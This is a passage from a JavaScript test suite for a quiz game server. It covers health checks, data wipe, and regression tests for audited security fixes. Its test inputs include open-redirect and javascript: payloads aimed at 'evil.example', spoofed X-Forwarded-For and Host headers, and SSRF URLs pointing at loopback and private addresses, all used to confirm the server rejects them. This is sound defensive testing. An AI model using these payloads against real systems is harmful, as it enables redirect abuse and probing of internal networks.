  // after to avoid bleed into other tests.
  clearJoinFailures('127.0.0.1');
  const ws = await openWs();
  ws.send(JSON.stringify({ type: 'player:join', name: 'X', email: 'x@x.test', joinCode: '0000' }));
  await waitMessage(ws, m => m.type === 'error' && /wrong join code/i.test(m.error || ''));
  ok(true, 'live WS reports wrong join code as an error message');
  try { ws.close(); } catch {}
  // Note: 127.0.0.1 may or may not be tracked depending on header parsing —
  // we don't assert isJoinBlocked here so other tests still join freely.
  clearJoinFailures('127.0.0.1');
}

// ----------------------------------------------------------------------------
// /health (O2): readiness for PaaS health checks.
// ----------------------------------------------------------------------------
async function healthEndpointTests() {
  section('/health (O2): readiness signal');
  const r = await request('GET', '/health');
  ok(r.status === 200, 'GET /health returns 200 when up');
  let j;
  try { j = JSON.parse(r.body); } catch { j = null; }
  ok(j && j.ok === true, 'body parses as JSON with ok:true');
  ok(typeof j.uptimeSec === 'number' && j.uptimeSec >= 0, 'uptimeSec is a non-negative number');
  ok(typeof j.questionsLoaded === 'number', 'questionsLoaded is exposed (may be 0 in a fresh deploy)');
  ok(j.phase === 'lobby' || j.phase === 'question' || j.phase === 'reveal' || j.phase === 'end', 'phase is a known game phase');
  ok(r.headers['cache-control'] && /no-store/.test(r.headers['cache-control']), 'response sets cache-control: no-store');
}

// ----------------------------------------------------------------------------
// Export & Wipe (O3): /admin/data:wipe end-to-end semantics.
// ----------------------------------------------------------------------------
async function dataWipeTests() {
  section('Data wipe (O3): export + delete in lobby is allowed; mid-game refused');

  // Reset to lobby state first.
  {
    const a = await loginAs('admin', process.env.ADMIN_TOKEN);
    const ws = await openWs({ cookie: a.cookie });
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(ws, m => m.type === 'admin:init');
    ws.send(JSON.stringify({ type: 'admin:action', action: 'game:host-action', payload: { hostAction: 'reset-game' } }));
    await new Promise(r => setTimeout(r, 80));
    try { ws.close(); } catch {}
  }

  // 1. Unauthenticated POST → 401/redirect (not allowed).
  {
    const r = await request('POST', '/admin/data:wipe', {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'confirm=WIPE+DATA'
    });
    ok(r.status === 401 || r.status === 302, 'unauthenticated wipe is rejected');
  }

  // 2. Authenticated but wrong confirmation string → 400.
  {
    const a = await loginAs('admin', process.env.ADMIN_TOKEN);
    const r = await request('POST', '/admin/data:wipe', {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded', cookie: a.cookie },
      body: 'confirm=wipe+data'   // lowercase, doesn't match
    });
    ok(r.status === 400, 'wrong confirmation string is rejected with 400');
    ok(/wipe data/i.test(r.body), 'error message mentions the expected literal');
  }

  // 3. Authenticated and confirmed → 200 with xlsx body + files deleted.
  {
    // Seed a config file so we can assert it gets removed.
    const fs = require('fs');
    const path = require('path');
    fs.writeFileSync(CONFIG_PATH, JSON.stringify({ companyName: 'WipeTest', theme: { ...DEFAULT_THEME } }), 'utf8');
    const beforeCfg = fs.existsSync(CONFIG_PATH);
    ok(beforeCfg, 'pre-wipe: config.json exists on disk');

    const a = await loginAs('admin', process.env.ADMIN_TOKEN);
    const r = await request('POST', '/admin/data:wipe', {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded', cookie: a.cookie },
      body: 'confirm=WIPE+DATA'
    });
    ok(r.status === 200, 'valid wipe returns 200');
    ok(/openxmlformats/.test(String(r.headers['content-type'] || '')), 'response content-type is xlsx');
    ok(r.buffer && r.buffer.slice(0, 2).toString() === 'PK', 'body is a ZIP (xlsx) magic header');

    // Files removed (config.json + questions.json should both be gone).
    ok(!fs.existsSync(CONFIG_PATH), 'config.json removed by wipe');
  }
}

// ----------------------------------------------------------------------------
// v1.1.1 security-audit regression tests (F1, F2, F4, F5, F6, F7).
// Each section maps to a finding in the 2026-05-19 Railway-targeted review.
// ----------------------------------------------------------------------------
async function v111SecurityFixTests() {
  // -- F1: parseCookies must not crash on malformed `%` sequences.
  section('F1: malformed cookie does not crash the server (URIError swallowed)');
  // Direct parseCookies smoke first — was throwing URIError pre-fix.
  let threw = null;
  try { parseCookies('omegaquiz_sess=%X'); } catch (e) { threw = e; }
  ok(threw === null, 'parseCookies tolerates malformed % encoding');
  threw = null;
  try { parseCookies('omegaquiz_sess=%'); } catch (e) { threw = e; }
  ok(threw === null, 'parseCookies tolerates a trailing %');
  // End-to-end via WS upgrade — pre-fix this triggered uncaughtException →
  // gracefulShutdown. Now we expect a normal connection that ignores the bad
  // cookie (ws.role === null).
  const ws = await openWs({ cookie: 'omegaquiz_sess=%X' });
  ws.send(JSON.stringify({ type: 'admin:hello' }));
  // We should get an "error: Not signed in" rather than a torn-down server.
  const m = await waitMessage(ws, x => x && x.type === 'error', 2000).catch(() => null);
  ok(m !== null, 'WS upgrade survives a malformed session cookie');
  try { ws.close(); } catch {}
  // And the HTTP path no longer leaks Express's default stack page.
  const httpRes = await request('GET', '/host', { headers: { Cookie: 'omegaquiz_sess=%X' } });
  ok(httpRes.status === 302 || httpRes.status === 500, 'HTTP auth-required path responds (302 redirect OR 500)');
  ok(!/URIError|at parseCookies|at sessionFromReq/.test(httpRes.body || ''), 'response body does not leak a JS stack');

  // -- F2: login rate-limit window guard.
  section('F2: login rate-limit blocks after 5 failures (was broken pre-fix)');
  const ip = '198.51.100.42'; // RFC 5737 documentation address
  clearLoginFailures(ip);
  ok(!isBlocked(ip), 'fresh IP starts unblocked');
  for (let i = 0; i < LOGIN_FAILURE_MAX - 1; i++) recordLoginFailure(ip);
  ok(!isBlocked(ip), `${LOGIN_FAILURE_MAX - 1} failures stays below threshold`);
  recordLoginFailure(ip);
  ok(isBlocked(ip), `${LOGIN_FAILURE_MAX} failures triggers block`);
  // Counter must NOT reset on the next failure (this is the bug we fixed).
  recordLoginFailure(ip);
  ok(isBlocked(ip), 'block persists across subsequent failures (counter not reset)');
  clearLoginFailures(ip);
  ok(!isBlocked(ip), 'clearLoginFailures unblocks');
  // End-to-end through POST /auth/login (uses 127.0.0.1 which TRUST_PROXY=auto
  // treats as a reverse-proxy peer — so we'll spoof XFF to use the test IP
  // and avoid stomping other tests' rate-limit bucket).
  clearLoginFailures(ip);
  let blockedAt = null;
  for (let i = 1; i <= LOGIN_FAILURE_MAX + 1; i++) {
    const r = await request('POST', '/auth/login', {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Forwarded-For': ip
      },
      body: 'role=admin&token=wrong' + i + '&next=' + encodeURIComponent('/admin')
    });
    if (r.status === 429) { blockedAt = i; break; }
  }
  ok(blockedAt !== null && blockedAt <= LOGIN_FAILURE_MAX + 1, `live POST blocked by attempt ${blockedAt}`);
  clearLoginFailures(ip);

  // -- F4: tightened `next` regex rejects scheme-relative URLs.
  section('F4: /auth/login?next= rejects scheme-relative open-redirect targets');
  ok(isSafeNext('/admin') === true, 'isSafeNext accepts /admin');
  ok(isSafeNext('/host?ref=qr') === true, 'isSafeNext accepts a benign path with query');
  ok(isSafeNext('//evil.example/path') === false, 'isSafeNext rejects // scheme-relative');
  ok(isSafeNext('/\\evil.example') === false, 'isSafeNext rejects /\\ Windows UNC shape');
  ok(isSafeNext('http://evil.example/x') === false, 'isSafeNext rejects http:// absolute');
  ok(isSafeNext('javascript:alert(1)') === false, 'isSafeNext rejects javascript:');
  ok(isSafeNext('') === false, 'isSafeNext rejects empty');
  ok(isSafeNext('a'.repeat(513)) === false, 'isSafeNext rejects oversized values');
  // GET reflection: the form field for an open-redirect next is sanitized to /<role>.
  const loginPage = await request('GET', '/auth/login?role=admin&next=' + encodeURIComponent('//evil.example/path'));
  ok(loginPage.status === 200, 'GET /auth/login returns 200');
  ok(!/value="\/\/evil\.example/.test(loginPage.body), 'form does NOT reflect //evil.example');
  ok(/name="next" value="\/admin"/.test(loginPage.body), 'form falls back to /admin');
  // POST: a valid token + malicious next should redirect to /admin, not //evil.example.
  clearLoginFailures(ip);
  const goodPost = await request('POST', '/auth/login', {
    headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'X-Forwarded-For': ip },
    body: 'role=admin&token=' + encodeURIComponent(process.env.ADMIN_TOKEN) + '&next=' + encodeURIComponent('//evil.example/owned')
  });
  ok(goodPost.status === 302, 'valid login returns 302');
  ok(goodPost.headers.location === '/admin', `Location is /admin (got "${goodPost.headers.location}")`);
  clearLoginFailures(ip);

  // -- F5: lifeline:askit only reaches authenticated WS roles.
  section('F5: lifeline:askit does not leak to unauthenticated WS clients');
  // Reset to known-good state and prepare an admin who will fire askit.
  const adminLogin = await loginAs('admin', process.env.ADMIN_TOKEN);
  const adminWs = await openWs({ cookie: adminLogin.cookie });
  adminWs.send(JSON.stringify({ type: 'admin:hello' }));
  await waitMessage(adminWs, m => m.type === 'admin:init');
  // Drain the post-hello admin:state push so it doesn't shadow later waits.
  await waitMessage(adminWs, m => m.type === 'admin:state').catch(() => null);
  // Reset and seed a fresh game with one player.
  adminWs.send(JSON.stringify({
    type: 'admin:action',
    action: 'game:host-action',
    payload: { hostAction: 'reset-game' }
  }));
  await new Promise(r => setTimeout(r, 60));
  // Pull the current join code from a fresh state push.
  let joinCode = null;
  adminWs.send(JSON.stringify({ type: 'admin:hello' }));
  const initAgain = await waitMessage(adminWs, m => m.type === 'admin:state');
  joinCode = initAgain.state.joinCode;
  // Open one player + one unauthenticated eavesdropper.
  const player = await openWs();
  clearJoinFailures('127.0.0.1');
  player.send(JSON.stringify({ type: 'player:join', name: 'F5P', email: 'f5@example.test', joinCode }));
  await waitMessage(player, m => m.type === 'player:joined');
  const eavesdropper = await openWs();
  // Track every message the eavesdropper receives.
  const evilMsgs = [];
  eavesdropper.on('message', raw => { try { evilMsgs.push(JSON.parse(raw)); } catch {} });
  // Start the game + fire askit.
  adminWs.send(JSON.stringify({ type: 'admin:action', action: 'game:host-action', payload: { hostAction: 'start-game' } }));
  await new Promise(r => setTimeout(r, 60));
  adminWs.send(JSON.stringify({ type: 'admin:action', action: 'game:host-action', payload: { hostAction: 'apply-lifeline', hostPayload: { type: 'askit' } } }));
  // Player should receive askit; eavesdropper should not.
  const playerSawAskit = await waitMessage(player, m => m.type === 'lifeline:askit', 1500).catch(() => null);
  ok(playerSawAskit !== null && typeof playerSawAskit.correctLetter === 'string', 'authenticated player receives lifeline:askit');
  await new Promise(r => setTimeout(r, 250)); // give time for any stray broadcast
  const evilSawAskit = evilMsgs.some(m => m && m.type === 'lifeline:askit');
  ok(!evilSawAskit, 'unauthenticated WS did NOT receive lifeline:askit');
  try { adminWs.close(); player.close(); eavesdropper.close(); } catch {}
  // Reset state so we don't leak into later tests.
  const reset = await loginAs('admin', process.env.ADMIN_TOKEN);
  const reAdmin = await openWs({ cookie: reset.cookie });
  reAdmin.send(JSON.stringify({ type: 'admin:hello' }));
  await waitMessage(reAdmin, m => m.type === 'admin:init');
  reAdmin.send(JSON.stringify({ type: 'admin:action', action: 'game:host-action', payload: { hostAction: 'reset-game' } }));
  await new Promise(r => setTimeout(r, 60));
  try { reAdmin.close(); } catch {}

  // -- F6: SSRF redirect re-validation.
  section('F6: fetchTextSafe re-validates every redirect hop');
  // Monkey-patch globalThis.fetch to simulate a 302 from a public host to
  // either a private IP or http://. Restore the original at the end so other
  // tests are unaffected.
  const realFetch = globalThis.fetch;
  function fakeRespond(status, headers, body = '') {
    const headerMap = new Map(Object.entries(headers).map(([k, v]) => [k.toLowerCase(), v]));
    return {
      ok: status >= 200 && status < 300,
      status,
      type: 'basic',
      headers: { get: k => headerMap.get(String(k).toLowerCase()) || null },
      body: {
        getReader() {
          let sent = false;
          return {
            async read() {
              if (sent) return { done: true };
              sent = true;
              return { value: new TextEncoder().encode(body), done: false };
            }
          };
        }
      }
    };
  }
  const fakeFetchSeqs = {
    'https://safe.example/manifest.json': [{ status: 302, headers: { location: 'http://safe.example/manifest.json' } }],
    'https://safe.example/private-redirect': [{ status: 302, headers: { location: 'https://10.0.0.5/secret' } }],
    'https://safe.example/loop': Array.from({ length: 10 }, () => ({ status: 302, headers: { location: 'https://safe.example/loop' } })),
    'https://safe.example/no-location': [{ status: 302, headers: {} }],
    'https://safe.example/ok': [{ status: 200, headers: { 'content-type': 'application/json' }, body: '{"ok":true}' }]
  };
  globalThis.fetch = async (urlStr /* , opts */) => {
    const seq = fakeFetchSeqs[urlStr];
    if (!seq) throw new Error('unexpected fetch URL in test: ' + urlStr);
    const step = seq.shift() || seq[seq.length - 1] || { status: 500, headers: {} };
    return fakeRespond(step.status, step.headers, step.body);
  };
  try {
    let err = null;
    try { await srv.fetchTextSafe('https://safe.example/manifest.json'); }
    catch (e) { err = e; }
    ok(err && /only https/i.test(err.message), 'redirect to http:// is refused after re-validation');
    err = null;
    try { await srv.fetchTextSafe('https://safe.example/private-redirect'); }
    catch (e) { err = e; }
    ok(err && /loopback|private/i.test(err.message), 'redirect to private IP is refused after re-validation');
    err = null;
    try { await srv.fetchTextSafe('https://safe.example/loop'); }
    catch (e) { err = e; }
    ok(err && /too many redirects/i.test(err.message), 'redirect loop is capped');
    err = null;
    try { await srv.fetchTextSafe('https://safe.example/no-location'); }
    catch (e) { err = e; }
    ok(err && /Location/i.test(err.message), 'redirect without Location header is refused');
    // Happy path: 200 OK passes through unchanged.
    const ok200 = await srv.fetchTextSafe('https://safe.example/ok');
    ok(ok200 && ok200.text === '{"ok":true}', 'non-redirect 200 still works');
  } finally {
    globalThis.fetch = realFetch;
  }

  // -- F7: HTTPS redirect uses a trusted base, not req.headers.host.
  section('F7: production HTTPS redirect uses configured base URL, not Host header');
  // Toggle NODE_ENV for one request. The middleware reads it at request time.
  const prevEnv = process.env.NODE_ENV;
  process.env.NODE_ENV = 'production';
  try {
    // No publicBaseUrl configured yet → expect 400 (not a redirect to Host header).
    const cleared = await request('POST', '/auth/branding-clear', {});  // probe endpoint may not exist — fall through harmlessly.
    cleared; // silence unused warning
    // Use a fresh request with a malicious Host header. We have no real
    // publicBaseUrl set in this test env, so we expect 400.
    const r = await request('GET', '/', { headers: { 'Host': 'evil.example' } });
    if (r.status === 400) {
      ok(true, 'no PUBLIC_BASE_URL → 400 (refuses to redirect to attacker-controlled Host)');
    } else if (r.status === 301) {
      ok(!/evil\.example/.test(String(r.headers.location || '')), 'redirect Location does not contain attacker Host');
    } else {
      ok(false, `unexpected status ${r.status} — expected 400 or 301 with safe Location`);
    }
  } finally {
    process.env.NODE_ENV = prevEnv;
  }
}

// ----------------------------------------------------------------------------
// SSRF guard (T1 supplementary): explicit loopback / private-IP refusals on
// fetchTextSafe (the seed-URL fetcher). Code path is the same one that admin
// "Browse sample packs" uses, so this protects both flows.
// ----------------------------------------------------------------------------
async function ssrfGuardTests() {
  section('SSRF guard (T1): loopback + private-IP URLs are refused');
  const { fetchTextSafe } = srv;
  const cases = [
    { url: 'http://example.com/x',         err: /only https/i, label: 'http:// scheme refused' },
    { url: 'ftp://example.com/x',          err: /only https/i, label: 'ftp:// scheme refused' },
    { url: 'https://localhost/x',          err: /private|loopback/i, label: 'localhost refused' },
    { url: 'https://foo.local/x',          err: /private|loopback/i, label: '.local TLD refused' },
    { url: 'https://127.0.0.1/x',          err: /loopback/i, label: '127.0.0.1 refused' },
    { url: 'https://10.0.0.5/x',           err: /loopback|private/i, label: '10/8 refused' },
    { url: 'https://192.168.1.1/x',        err: /loopback|private/i, label: '192.168/16 refused' },
    { url: 'https://172.16.5.5/x',         err: /private/i, label: '172.16/12 refused' },
    { url: 'https://[::1]/x',              err: /ipv6/i, label: 'IPv6 loopback refused' },
    { url: 'not-a-url',                    err: /invalid url/i, label: 'malformed URL refused' }
  ];
  for (const c of cases) {
    let thrown = null;
    try { await fetchTextSafe(c.url); } catch (e) { thrown = e; }
    ok(thrown && c.err.test(thrown.message), c.label + ' (got: ' + (thrown ? thrown.message : 'no error') + ')');
  }
}

// ----------------------------------------------------------------------------
// Run everything
// ----------------------------------------------------------------------------
(async () => {
  // Start the imported server on a random port.
  await new Promise((resolve, reject) => {
    server.listen(0, '127.0.0.1', resolve);
    server.on('error', reject);
  });
  console.log('Test server listening on port ' + getPort() + '\n');

  try {
    unitTests();
    await httpTests();
    await wsTests();
    await bonusBugTest();
    await magicLinkTests();
    await brandingTests();
    await themeAndLevelTests();
    await publicBaseUrlTests();
    await questionImageTests();
    await csvTests();
    await liveTallyTests();
    await emptyStartTests();
    await returnToLobbyTests();
    await consentTextTests();
    await playerReconnectTests();
    await joinRateLimitTests();
    await healthEndpointTests();
    await ssrfGuardTests();
    await v111SecurityFixTests();
    await dataWipeTests();   // run last — it removes data files
  } catch (e) {
    console.error('\nTest run aborted by exception:', e);
    fail++;
  }

  console.log('\n--------------------------------------------------');
  console.log(`\x1b[1mResult: ${pass} passed, ${fail} failed\x1b[0m`);
  if (failures.length) {
    console.log('Failures:');
    failures.forEach(f => console.log('  - ' + f.name + (f.detail ? '\n      ' + f.detail : '')));
  }
  console.log('--------------------------------------------------');

  // Shut down cleanly so the process exits.
  server.close();
  setTimeout(() => process.exit(fail === 0 ? 0 : 1), 200);
})();
